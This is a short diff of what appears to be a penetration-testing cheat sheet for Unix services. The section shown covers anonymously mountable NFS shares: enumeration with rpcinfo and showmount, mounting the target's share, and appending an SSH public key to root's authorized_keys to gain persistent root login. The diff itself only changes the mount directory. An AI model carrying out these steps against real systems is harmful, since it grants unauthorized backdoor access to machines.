@@ -3,15 +3,14 @@ Unix
 
 # NFS Shares Anonymous Mountable
 
-rpcinfo -p <target-IP>	 Search for NFS shares.
+rpcinfo -p <target-IP>
 
 showmount -e <target-IP>
-
-mount -t nfs <target-IP>:/share /root/tmp/
+mount -t nfs <target-IP>:/share /mnt/tmp
 
 cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
 
-umount /root/tmp
+umount /mnt/tmp
 ------------------------------------------------------------------------------------------------------
 
 # Rstatd enabled
